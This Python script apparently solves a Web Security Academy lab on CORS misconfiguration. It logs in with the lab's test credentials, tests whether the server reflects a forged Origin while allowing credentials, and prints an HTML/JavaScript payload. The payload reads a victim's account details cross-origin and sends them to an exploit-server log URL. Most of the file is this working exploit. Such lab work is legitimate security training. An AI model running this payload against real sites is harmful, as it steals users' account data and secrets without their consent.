import requests
from bs4 import BeautifulSoup

def login_and_get_session(login_url, username, password):
    session = requests.Session()
    
    # Get the login page first to capture hidden form fields (like CSRF tokens)
    login_page = session.get(login_url)
    if login_page.status_code != 200:
        print(f"[!] Failed to load login page, status code: {login_page.status_code}")
        return None

    soup = BeautifulSoup(login_page.content, 'html.parser')

    # Find the login form and extract hidden input fields
    login_form = soup.find('form')
    if not login_form:
        print("[!] Login form not found")
        return None

    form_data = {}
    for input_tag in login_form.find_all('input'):
        if input_tag.get('name'):
            form_data[input_tag['name']] = input_tag.get('value', '')

    print(f"[DEBUG] Form data before adding credentials: {form_data}")

    # Update the form data with username and password
    form_data.update({
        'username': username,
        'password': password
    })

    print(f"[DEBUG] Form data after adding credentials: {form_data}")

    # Submit the login form
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    response = session.post(login_url, data=form_data, headers=headers, allow_redirects=True)
    if response.status_code == 200 and 'session' in session.cookies:
        print("[+] Logged in successfully")
        return session
    else:
        print(f"[!] Login failed, status code: {response.status_code}")
        print(f"[DEBUG] Response content: {response.content}")
        return None

def check_cors_vulnerability(session, url, evil_origin):
    headers = {
        'Origin': evil_origin,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    try:
        response = session.get(url, headers=headers)
        cors_origin = response.headers.get('Access-Control-Allow-Origin')
        cors_credentials = response.headers.get('Access-Control-Allow-Credentials')

        print(f"[DEBUG] Response Headers: {response.headers}")

        if cors_origin and cors_credentials:
            if cors_origin == evil_origin and cors_credentials == 'true':
                print(f"[+] Vulnerable to CORS: {url}")
                return True
            else:
                print(f"[-] Reflecting but not vulnerable: {url}")
                return False
        else:
            print(f"[-] No CORS headers present: {url}")
            return False
    except requests.RequestException as e:
        print(f"[!] Error: {e}")
        return False

def exploit_cors_vulnerability(lab_url, exploit_server_url):
    exploit_html = f"""
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','{lab_url}/accountDetails',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {{
            location='{exploit_server_url}/log?key=' + this.responseText;
        }};
    </script>
    """
    print("[+] Use the following HTML to exploit the vulnerability:")
    print(exploit_html)

if __name__ == "__main__":
    login_url = "https://0a94009a044462e681ba4dc500d20093.web-security-academy.net/login"
    target_url = "https://0a94009a044462e681ba4dc500d20093.web-security-academy.net/accountDetails"
    evil_origin = "https://example.com"  # Using the example origin as per lab instructions
    exploit_server_url = "https://exploit-0a8900e80444620281c94cd9013700c5.exploit-server.net"
    username = "wiener"
    password = "peter"

    session = login_and_get_session(login_url, username, password)
    if session and check_cors_vulnerability(session, target_url, evil_origin):
        exploit_cors_vulnerability(target_url, exploit_server_url)
